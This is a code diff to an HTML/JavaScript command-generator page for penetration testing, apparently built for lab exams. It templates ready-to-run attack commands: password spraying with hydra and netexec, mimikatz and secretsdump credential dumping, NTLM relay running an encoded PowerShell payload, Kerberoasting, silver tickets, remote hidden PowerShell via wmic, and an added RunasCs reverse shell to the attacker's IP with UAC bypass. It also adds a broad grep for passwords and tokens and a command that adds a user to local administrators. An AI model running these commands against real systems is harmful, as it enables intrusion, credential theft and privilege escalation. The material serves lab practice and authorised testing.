@@ -18,6 +18,7 @@
       --ok: #7bd88f;
       --kali: #b8e986;
       --target: #ffd166;
+      --impt: #ff0000;
     }
 
     * {
@@ -381,6 +382,10 @@
       color: var(--target);
     }
 
+    .command-prefix.impt {
+      color: var(--impt);
+    }
+
     .copy-status {
       margin-left: 8px;
       color: var(--ok);
@@ -699,6 +704,16 @@ lab</textarea>
       "PrintSpoofer64.exe"
     ];
 
+    const JOHN_FORMATS_BY_HASHCAT_MODE = {
+      "0": "raw-md5",
+      "1000": "NT",
+      "5600": "netntlmv2",
+      "2100": "mscash2",
+      "13400": "KeePass",
+      "22921": "SSH",
+      "18200": "krb5asrep"
+    };
+
     const COMMAND_SECTIONS = [
       {
         id: "createFileFolders",
@@ -711,16 +726,16 @@ lab</textarea>
       },
       {
         id: "Nmap",
-        title: "Nmap",
+        title: "Nmap (typically ignore 5040 7680)",
         nav: "Nmap",
         group: "Enumeration",
         commands: [
+          { prefix: "161 SNMP", className: "impt", template: "sudo nmap -v -Pn -sV -sC -sU --top-ports 10 -T4 -oN chl/{last}/{last}_UDP {target}" },
           { prefix: "Top 1000 ports", template: "sudo nmap -v -Pn -sV -sC -oN chl/{last}/{last} {target}" },
           { prefix: "TCP ports discovery", template: "sudo nmap -v -Pn -p- -T4 -oG chl/{last}/{last}_allports {target}" },
           { prefix: "Get open ports", template: "ports=$(grep -oP '\\d+(?=/open)' chl/{last}/{last}_allports | sort -nu | paste -sd,)" },
           { prefix: "Service scan", template: "sudo nmap -v -Pn -sV -sC -p$ports -oN chl/{last}/{last}_services {target}" },
           { prefix: "Vuln scan", template: "sudo nmap -v -Pn -sV -sC --script vuln -p$ports -oN chl/{last}/{last}_vuln {target}" },
-          { prefix: "161 SNMP", template: "sudo nmap -v -Pn -sV -sC -sU --top-ports 10 -T4 -oN chl/{last}/{last}_UDP {target}" },
           //{ prefix: "All ports", template: "sudo nmap -v -Pn -sV -sC -p- -T4 -oN chl/{last}/{last}_all {target}" }
         ]
       },
@@ -782,15 +797,16 @@ lab</textarea>
         nav: "Hydra",
         group: "Password Spray",
         options: [
-          { id: "hydraPort", type: "checkbox", label: "Add -s {port}" }
+          { id: "hydraPort", type: "checkbox", label: "Add -s {port}" },
+          { id: "hydraUseTargetsFile", type: "checkbox", label: "Use targets.txt (-M)" }
         ],
         commands: [
-          { template: "hydra -t 1{hydraPortFlag} -L users.txt -P passwords.txt {service}://{target}" },
-          { template: "hydra -t 1{hydraPortFlag} -L users.txt -p '{password}' {service}://{target}" },
-          { template: "hydra -t 1{hydraPortFlag} -l '{user}' -P passwords.txt {service}://{target}" },
-          { template: "hydra -t 1{hydraPortFlag} -l '{user}' -p '{password}' {service}://{target}" },
-          { prefix: "Try default creds", template: "hydra -t 1{hydraPortFlag} -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/seclists/Usernames/top-usernames-shortlist.txt {service}://{target}" },
-          { prefix: "Try null, reverse, and same password", template: "hydra -t 1{hydraPortFlag} -L users.txt -e nsr {service}://{target}" }
+          { template: "hydra -t 1{hydraPortFlag}{hydraTargetsFileFlag} -L users.txt -P passwords.txt {hydraTargetSpec}" },
+          { template: "hydra -t 1{hydraPortFlag}{hydraTargetsFileFlag} -L users.txt -p '{password}' {hydraTargetSpec}" },
+          { template: "hydra -t 1{hydraPortFlag}{hydraTargetsFileFlag} -l '{user}' -P passwords.txt {hydraTargetSpec}" },
+          { template: "hydra -t 1{hydraPortFlag}{hydraTargetsFileFlag} -l '{user}' -p '{password}' {hydraTargetSpec}" },
+          { prefix: "Try default creds", template: "hydra -t 1{hydraPortFlag}{hydraTargetsFileFlag} -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/seclists/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt {hydraTargetSpec}" },
+          { prefix: "Try null, reverse, and same password", template: "hydra -t 1{hydraPortFlag}{hydraTargetsFileFlag} -L users.txt -e nsr {hydraTargetSpec}" }
         ]
       },
       {
@@ -807,6 +823,7 @@ lab</textarea>
                 { value: "hash", label: "Hash" }
               ] },
               { id: "nxcPort", type: "checkbox", label: "Add --port {port}" },
+              { id: "nxcUseTargetsFile", type: "checkbox", label: "Use targets.txt" },
               { id: "nxcLocalAuth", type: "checkbox", label: "Add --local-auth" },
               { id: "nxcCommandExec", type: "checkbox", label: "Add -X 'powershell -e '" },
               { id: "nobruteforce", type: "checkbox", label: "Add --no-bruteforce" }
@@ -826,14 +843,15 @@ lab</textarea>
           }
         ],
         commands: [
-          { prefix: "Anonymous SMB enumeration", template: "netexec smb {target}{nxcSmbFlags}" },
-          { template: "nxc {service} {target}{nxcPortFlag} -u users.txt{nxcCredFileFlag}{nxcGeneralFlags}{nxcServiceFlags} --continue-on-success" },
-          { template: "nxc {service} {target}{nxcPortFlag} -u users.txt{nxcCredSingleFlag}{nxcGeneralFlags}{nxcServiceFlags} --continue-on-success" },
-          { template: "nxc {service} {target}{nxcPortFlag} -u '{user}'{nxcCredFileFlag}{nxcGeneralFlags}{nxcServiceFlags} --continue-on-success" },
-          { template: "nxc {service} {target}{nxcPortFlag} -u '{user}'{nxcCredSingleFlag}{nxcGeneralFlags}{nxcServiceFlags}{nxcCommandExecFlag}" },
-          { prefix: "Bloodhound against DC", template: "nxc ldap {target} -u '{user}' -p '{password}' --bloodhound --collection ALL --dns-server {target}" },
-          { prefix: "SSH key file", template: "nxc ssh {target}{nxcPortFlag} -u users.txt --key-file id_ecdsa -p '{password}'{nxcGeneralFlags}{nxcCommandExecFlag}" },
-          { prefix: "Try default creds", template: "nxc {service} {target}{nxcPortFlag} -u /usr/share/seclists/Usernames/top-usernames-shortlist.txt -p /usr/share/wordlists/seclists/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt{nxcGeneralFlags}{nxcServiceFlags} --continue-on-success" }
+          { prefix: "BLOODHOUND against DC", className: "impt", template: "nxc ldap {nxcTarget} -u '{user}' -p '{password}' --bloodhound --collection ALL --dns-server {target}" },
+          { prefix: "Anonymous SMB enumeration", template: "netexec smb {nxcTarget}{nxcSmbFlags}" },
+          { template: "nxc {service} {nxcTarget}{nxcPortFlag} -u users.txt{nxcCredFileFlag}{nxcGeneralFlags}{nxcServiceFlags} --continue-on-success" },
+          { template: "nxc {service} {nxcTarget}{nxcPortFlag} -u users.txt{nxcCredSingleFlag}{nxcGeneralFlags}{nxcServiceFlags} --continue-on-success" },
+          { template: "nxc {service} {nxcTarget}{nxcPortFlag} -u '{user}'{nxcCredFileFlag}{nxcGeneralFlags}{nxcServiceFlags} --continue-on-success" },
+          { template: "nxc {service} {nxcTarget}{nxcPortFlag} -u '{user}'{nxcCredSingleFlag}{nxcGeneralFlags}{nxcServiceFlags}{nxcCommandExecFlag}" },
+          { prefix: "Get list of user from D.C.", template: "nxc ldap {nxcTarget} -u '{user}' -p '{password}' --users | fgrep -v '[' | fgrep -vi '-Username-' | awk '{print$ 5}' | tee users.txt" },
+          { prefix: "SSH key file", template: "nxc ssh {nxcTarget}{nxcPortFlag} -u users.txt --key-file id_ecdsa -p '{password}'{nxcGeneralFlags}{nxcCommandExecFlag}" },
+          { prefix: "Try default creds", template: "nxc {service} {nxcTarget}{nxcPortFlag} -u /usr/share/seclists/Usernames/top-usernames-shortlist.txt -p /usr/share/wordlists/seclists/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt{nxcGeneralFlags} --continue-on-success" }
         ]
       },
       {
@@ -841,12 +859,14 @@ lab</textarea>
         title: "Password cracking",
         nav: "Password cracking",
         options: [
-          { id: "hashcatModule", type: "select", label: "Hashcat mode", choices: [
-            { value: "1000", label: "NTLM 1000" },
-            { value: "2100", label: "DCC2 / MSCache v2" },
-            { value: "13400", label: "KeePass 13400" },
-            { value: "22921", label: "SSH 22921" },
-            { value: "18200", label: "AS-REP 18200" }
+          { id: "hashcatModule", type: "select", label: "Hash type", choices: [
+            { value: "0", label: "MD5 (Hashcat 0 / John raw-md5)" },
+            { value: "1000", label: "NTLM (Hashcat 1000 / John NT)" },
+            { value: "5600", label: "NTLMv2-SSP / NetNTLMv2 (Hashcat 5600 / John netntlmv2)" },
+            { value: "2100", label: "DCC2 / MSCache v2 (Hashcat 2100 / John mscash2)" },
+            { value: "13400", label: "KeePass (Hashcat 13400 / John KeePass)" },
+            { value: "22921", label: "SSH (Hashcat 22921 / John SSH)" },
+            { value: "18200", label: "AS-REP (Hashcat 18200 / John krb5asrep)" }
           ] },
           { id: "hashcatUseRule", type: "checkbox", label: "Use rule file" },
           { id: "hashcatRuleFile", type: "text", label: "Rule file", defaultValue: "/usr/share/hashcat/rules/best66.rule" }
@@ -857,8 +877,8 @@ lab</textarea>
           { prefix: "unshadow", template: "unshadow passwd shadow > combined_hashes.txt" },
           { prefix: "KeePass password", template: "keepass2john Database.kdbx > keepass.hash" },
           { prefix: "KeePass browse content", template: "kpcli --kdb=Database.kdbx" },
-          { prefix: "john", template: "john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt" },
-          { prefix: "", template: "john --show hashes.txt" },
+          { prefix: "john", template: "john --format={johnFormat} --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt" },
+          { prefix: "", template: "john --format={johnFormat} --show hashes.txt" },
           { prefix: "", template: "cat ~/.john/john.pot" },
           { prefix: "hashcat", template: "hashcat -m {hashcatModule} hashes.txt /usr/share/wordlists/rockyou.txt{hashcatRuleFlag} --force" },
           { prefix: "", template: "hashcat --show -m {hashcatModule} hashes.txt" }
@@ -897,7 +917,7 @@ lab</textarea>
         group: "Protocols",
         commands: [
           { prefix: "Anonymous search", template: "ldapsearch -H ldap://{target}/ -x -b \"{ldapBaseDn}\" \"(objectClass=*)\"" },
-          { prefix: "Dump LAPS passwords", template: "nxc ldap {target} -u '{user}' -p '{password}' -M laps" }
+          { prefix: "Dump LAPS passwords", template: "nxc ldap {nxcTarget} -u '{user}' -p '{password}' -M laps" }
         ]
       },
       {
@@ -966,8 +986,10 @@ lab</textarea>
         nav: "SNMP",
         group: "Protocols",
         commands: [
+          { prefix: "snmpbrute to find community string", template: "python snmpbrute.py -t {target} -f /usr/share/wordlists/seclists/Discovery/SNMP/snmp.txt | tee snmpbrute.txt" },
           { prefix: "v2c", template: "snmpwalk -v2c -c public -On {target} .1 | tee snmp2.txt" },
-          { prefix: "v1", template: "snmpwalk -v1 -c public -On {target} .1 | tee snmp1.txt   " }
+          { prefix: "v1", template: "snmpwalk -v1 -c public -On {target} .1 | tee snmp1.txt" },
+          { prefix: "snmp-check", template: "snmp-check -c monitor {target} | tee snmp-check.txt" }
         ]
       },
       {
@@ -1016,6 +1038,15 @@ lab</textarea>
         group: "Protocols",
         commands: [
           { prefix: "Windows", className: "target", template: "wmic /node:{target} /user:{user} /password:'{password}' process call create \"powershell -nop -w hidden -e JABjAGwAaQ......gBOAGUAdAA\"" }
+        ]
+      },
+      {
+        id: "RunasCs",
+        title: "RunasCs",
+        nav: "RunasCs",
+        group: "Privilege escalation",
+        commands: [
+          { prefix: "", template: ".\\RunasCs.exe {user} {password} -d {domain} cmd.exe -r {kaliIp}:{port} --bypass-uac" }
         ]
       },
       {
@@ -1070,6 +1101,8 @@ lab</textarea>
         group: "Privilege escalation",
         commands: [
           { prefix: "LinPEAS (env, autorun, cron, SUID, listening ports, files with capabilities)", template: "./linpeas.sh -s 2>&1 | tee linpeas.txt" },
+          { prefix: "LinEnum", template: "LinEnum.sh -t 2>&1 | tee linenum.txt" },
+          { prefix: "Find creds", template: "grep --color=never -rinPo '.{0,50}(password|passwd|username|token|secret|admin|login|credential|api[-]?key|user|pass|key).{0,50}' ./ 2>/dev/null | grep --color=always -iE 'password|passwd|username|token|secret|admin|login|credential|api[-]?key|user|pass|key|$'" },
           { prefix: "sudo commmands", template: "sudo -l" },
           { prefix: "Group memberships", template: "id" },
           { prefix: "Environment variables", template: "env" },
@@ -1123,10 +1156,12 @@ lab</textarea>
           { prefix: "Local user's group membership", template: "net user {user}" },
           { prefix: "List local groups", template: "net localgroup" },
           { prefix: "Local group's members", template: "net localgroup \"administrators\"" },
+          { prefix: "Add user to local admin", template: "net localgroup \"administrators\" \"{user}\" /add" },
           { prefix: "PowerShell history", template: "Get-Content (Get-PSReadLineOption).HistorySavePath" },
           { prefix: "Password policy", template: "net accounts" },
           { prefix: "Permission", template: "icacls <path>" },
-          { prefix: "Watch-Command", template: "Import-Module Watch-Command.ps1" },
+          { prefix: "Find interesting files", template: "cmd /c dir /s *pass* == *cred* == *vnc* == *config*" },
+          { prefix: "Watch-Command", template: ". .\\Watch-Command.ps1" },
           { prefix: "Process snapshot", template: "Get-CimInstance Win32_Process |  Select Name, ProcessId, ParentProcessId, ExecutablePath, CommandLine" },
           { prefix: "Process snapshot with  Watch-Command", template: "Get-CimInstance Win32_Process | Select-Object Name, ProcessId, ParentProcessId, ExecutablePath, CommandLine | Watch-Command -Diff -Cont -Verbose -Seconds 0 -Property ProcessId" },
           { prefix: "Service snapshot", template: "Get-CimInstance Win32_Service | Select Name, State, StartMode, StartName, ProcessId, PathName" },
@@ -1138,7 +1173,6 @@ lab</textarea>
 
     try {
         $p = Get-CimInstance Win32_Process -Filter "ProcessId=$($e.ProcessID)" -ErrorAction Stop
-
         $owner = Invoke-CimMethod -InputObject $p -MethodName GetOwner -ErrorAction SilentlyContinue
 
         [PSCustomObject]@{
@@ -1149,10 +1183,18 @@ lab</textarea>
             User        = if ($owner.User) { "$($owner.Domain)\\$($owner.User)" } else { "N/A" }
             Executable  = $p.ExecutablePath
             CommandLine = $p.CommandLine
-        } | Format-List
+        }
     }
     catch {
-        Write-Host "$(Get-Date -Format 'HH:mm:ss') $($e.ProcessName) PID=$($e.ProcessID) PPID=$($e.ParentProcessID) [process exited before details could be queried]"
+        [PSCustomObject]@{
+            Time        = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+            Process     = $e.ProcessName
+            PID         = $e.ProcessID
+            PPID        = $e.ParentProcessID
+            User        = "N/A"
+            Executable  = "N/A"
+            CommandLine = "Process exited before details could be queried"
+        }
     }
 }`
 },
@@ -1181,7 +1223,7 @@ lab</textarea>
         nav: "Mimikatz",
         group: "Windows enumeration",
         commands: [
-          { prefix: "SYSTEM", template: ".\\mimikatz.exe \"log mimikatz.log\" \"privilege::debug\" \"token::elevate\" \"lsadump::sam\" \"sekurlsa::logonpasswords\" \"log\" \"exit\"" },
+          { prefix: "as SYSTEM. Follow up with secretsdump", template: ".\\mimikatz.exe \"log mimikatz.log\" \"privilege::debug\" \"token::elevate\" \"lsadump::sam\" \"sekurlsa::logonpasswords\" \"log\" \"exit\"" },
           { prefix: "Only SeDebugPrivilege", template: ".\\mimikatz.exe \"log mimikatz_debug.log\" \"privilege::debug\" \"sekurlsa::logonpasswords\" \"log\" \"exit\"" },
           { prefix: "Enumerate tickets", template: ".\\mimikatz.exe \"log mimikatz_ticket.log\" \"privilege::debug\" \"token::elevate\" \"sekurlsa::tickets\" \"log\" \"exit\"" },
           { prefix: "Dump tickets", template: ".\\mimikatz.exe \"log mimikatz_dump.log\" \"privilege::debug\" \"token::elevate\" \"sekurlsa::tickets /export\" \"log\" \"exit\"" },
@@ -1198,7 +1240,8 @@ lab</textarea>
             { value: "password", label: "Password" },
             { value: "hash", label: "Hash" }
           ] },
-          { id: "impacketUseTicket", type: "checkbox", label: "Use exported Kerberos ticket" }
+          { id: "impacketUseTicket", type: "checkbox", label: "Use exported Kerberos ticket" },
+          { id: "impacketNtlmRelayUseTargetsFile", type: "checkbox", label: "NTLM relay: use targets.txt (-tf)" }
         ],
         commands: [
           { prefix: "Dump everything (works on local and DC)", template: "impacket-secretsdump{impacketRemoteAuthFlag} {impacketRemoteTarget}" },
@@ -1206,13 +1249,14 @@ lab</textarea>
           { prefix: "Local admin & ADMIN$", template: "impacket-psexec{impacketRemoteAuthFlag} {impacketRemoteTarget}" },
           { prefix: "", template: "impacket-wmiexec{impacketRemoteAuthFlag} {impacketRemoteTarget}" },
           { prefix: "Dump NTDS", template: "impacket-secretsdump -just-dc{impacketRemoteAuthFlag} {impacketRemoteTarget}" },
-          { prefix: "SMB NTLM relay", template: "impacket-ntlmrelayx --no-http-server -smb2support -t {target} -c \"powershell -enc JABjAGwAaQBlAG4AdA...\"" },
-          { prefix: "AS-REP Roast", template: "impacket-GetNPUsers{impacketDirectoryAuthFlag} -dc-ip {target} -request -outputfile hashes.asreproast {impacketDirectoryTarget}" },
-          { prefix: "", template: "impacket-GetNPUsers -dc-ip {target} {domain}/ -usersfile users.txt" },
+          { prefix: "SMB NTLM relay (dumps local SAM if no commands used)", template: "impacket-ntlmrelayx --no-http-server -smb2support{impacketNtlmRelayTargetFlag} -c \"powershell -enc JABjAGwAaQBlAG4AdA...\"" },
+          { prefix: "AS-REP Roast with valid cred", template: "impacket-GetNPUsers{impacketDirectoryAuthFlag} -dc-ip {target} -outputfile hashes.asreproast -request {impacketDirectoryTarget}" },
+          { prefix: "AS-REP Roast with user list", template: "impacket-GetNPUsers -dc-ip {target} -outputfile hashes.asreproast {domain}/ -usersfile users.txt" },
           { prefix: "Kerberoast", template: "impacket-GetUserSPNs{impacketDirectoryAuthFlag} -dc-ip {target} -request -outputfile hashes.kerberoast {impacketDirectoryTarget}" },
           { prefix: "Dump local SAM hashes", template: "impacket-secretsdump -sam SAM -system SYSTEM local" },
           { prefix: "Silver ticket", template: "impacket-ticketer -nthash {hash} -domain-sid {domainSid} -domain {domain} -spn {user}/{hostname}.{domain} -user-id 500 Administrator" },
-          { prefix: "Microsoft SQL (MSSQL) servers", template: "impacket-mssqlclient{impacketRemoteAuthFlag} {impacketRemoteTarget}" }
+          { prefix: "Microsoft SQL (MSSQL) servers", template: "impacket-mssqlclient{impacketRemoteAuthFlag} {impacketRemoteTarget}" },
+          { prefix: "smbclient", template: "impacket-smbclient{impacketRemoteAuthFlag} {impacketRemoteTarget}" }
         ]
       },
       {
@@ -1758,8 +1802,12 @@ lab</textarea>
       const impacketAuthMode = optionValue("impacketAuthMode", "password");
 
       values.hydraPortFlag = optionChecked("hydraPort") ? ` -s ${values.port}` : "";
+      const hydraUseTargetsFile = optionChecked("hydraUseTargetsFile");
+      values.hydraTargetsFileFlag = hydraUseTargetsFile ? " -M targets.txt" : "";
+      values.hydraTargetSpec = hydraUseTargetsFile ? values.service : `${values.service}://${values.target}`;
       values.rdpDomainFlag = optionChecked("rdpDomain") ? ` /d:${values.domain}` : "";
       values.nxcPortFlag = optionChecked("nxcPort") ? ` --port ${values.port}` : "";
+      values.nxcTarget = optionChecked("nxcUseTargetsFile") ? "targets.txt" : values.target;
       values.nxcCommandExecFlag = optionChecked("nxcCommandExec") ? " -X 'powershell -e '" : "";
       values.nxcGeneralFlags = [
         optionChecked("nxcLocalAuth") ? " --local-auth" : "",
@@ -1781,6 +1829,9 @@ lab</textarea>
       values.nxcCredSingleFlag = nxcAuthMode === "hash" ? ` -H '${values.hash}'` : ` -p '${values.password}'`;
       values.impacketHashFlag = impacketAuthMode === "hash" ? ` -hashes :${values.hash}` : "";
       values.impacketPwFlag = impacketAuthMode === "hash" ? "" : `:'${values.password}'`;
+      values.impacketNtlmRelayTargetFlag = optionChecked("impacketNtlmRelayUseTargetsFile")
+        ? " -tf targets.txt"
+        : ` -t ${values.target}`;
 
       const impacketUseTicket = optionChecked("impacketUseTicket");
       values.impacketRemoteAuthFlag = impacketUseTicket
@@ -1859,6 +1910,7 @@ lab</textarea>
         ? ""
         : ` -U '${values.user}'`;
       values.hashcatModule = optionValue("hashcatModule", "1000");
+      values.johnFormat = JOHN_FORMATS_BY_HASHCAT_MODE[values.hashcatModule] || "NT";
       values.hashcatRuleFile = optionValue("hashcatRuleFile", "/usr/share/hashcat/rules/best66.rule").trim() || "/usr/share/hashcat/rules/best66.rule";
       values.hashcatRuleFlag = optionChecked("hashcatUseRule") ? ` -r ${values.hashcatRuleFile}` : "";
       values.smbShare = optionValue("smbShare", "SYSVOL");
